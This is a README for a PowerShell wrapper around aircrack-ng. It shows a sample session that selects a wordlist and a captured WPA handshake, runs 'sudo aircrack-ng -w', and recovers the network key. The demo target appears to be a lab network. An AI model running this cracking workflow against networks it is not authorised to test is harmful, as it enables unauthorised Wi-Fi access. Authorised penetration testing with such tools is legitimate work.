# PowerShell aircrack-ng
A PowerShell Script to crack WPA/WPA2 Passwords using aircrack-ng on linux

```
┌──(superuser㉿)-[/home/cipher/github/aircrack-ps1]
└─$ PS>./aircrack.ps1
   .               .    
 .´  ·  .     .  ·  `.  aircrack-ps1 1.2.0
 :  :  :  (¯)  :  :  :  A wifi cracking tool in powershell
 `.  ·  ` /¯\ ´  ·  .´  created & maintained by : c1ph3rwolf
   `     /¯¯¯\     ´    requirement             : aircrack-ng
                        source-repository       : https://github.com/c1ph3rwolf/aircrack-ps1

aircrack-ps1
│  
├── WorldLists
│   ├── [ 1 ] Select WorldLists from : /usr/share/wordlists/
│   ├── List of Files : 
│   │   ├── 1. fasttrack.txt
│   │   ├── 2. jiofibers.lst
│   │   ├── 3. john.lst
│   │   ├── 4. nmap.lst
│   │   ├── 5. rockyou.txt.gz
│   │   ├── 6. sorted_wifite.txt
│   │   ├── 7. sqlmap.txt
│   │   ├── 8. wifite.txt
│   │   ├── Enter the index number of the file:: 8
│   │   ├──  [ Selected ] : wifite.txt
│   │   ├── You have Selected (WordList): /usr/share/wordlists/wifite.txt
├── Handshakes
│   ├── [ 2 ] Select Handshakes from : /home/cipher/hs
│   ├── List of Files : 
│   │   ├── 1. hacku.cap
│   │   ├── 2. handshake_SmartHome_A8-DA-0C-85-A0-6F_2023-06-29T05-28-31.cap
│   │   ├── 3. README.md
│   │   ├── Enter the index number of the file:: 1
│   │   ├──  [ Selected ] : hacku.cap
│   │   ├── You have Selected (Handshake): /home/cipher/hs/hacku.cap
├── sudo aircrack-ng -w /usr/share/wordlists/wifite.txt /home/cipher/hs/hacku.cap
├── Crack WPA/WPA2 WiFi Handshake Now (y/n) : : y                                                                                             
│   ├── Cracking Handshake using aircrack-ng
Reading packets, please wait...                                                                                                               
Opening /home/cipher/hs/hacku.cap
Resetting EAPOL Handshake decoder state.
Read 7657 packets.

   #  BSSID              ESSID                     Encryption

   1  7A:0C:B8:C9:37:F9  Hack Me If You Can!       WPA (1 handshake)

Choosing first network as target.

Reading packets, please wait...
Opening /home/cipher/hs/hacku.cap
Resetting EAPOL Handshake decoder state.
Read 7657 packets.

1 potential targets


                               Aircrack-ng 1.7 

      [00:00:50] 48872/203809 keys tested (980.34 k/s) 

      Time left: 2 minutes, 38 seconds                          23.98%

                        KEY FOUND! [ password123456 ]


      Master Key     : 04 08 76 3F 82 7E 3F 53 85 46 B6 4B 8E 3A 90 DB 
                       7F F4 92 08 76 F9 7A DE 6D 2E 64 AC 87 E2 12 95 

      Transient Key  : 08 36 B1 80 69 1C FF 7F F8 B8 33 2F D5 75 DB 3F 
                       15 54 BA D5 42 88 6E 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

      EAPOL HMAC     : 9A 23 DD 40 14 3A B2 47 8A A8 24 DA 3A 7D A6 B4 



```
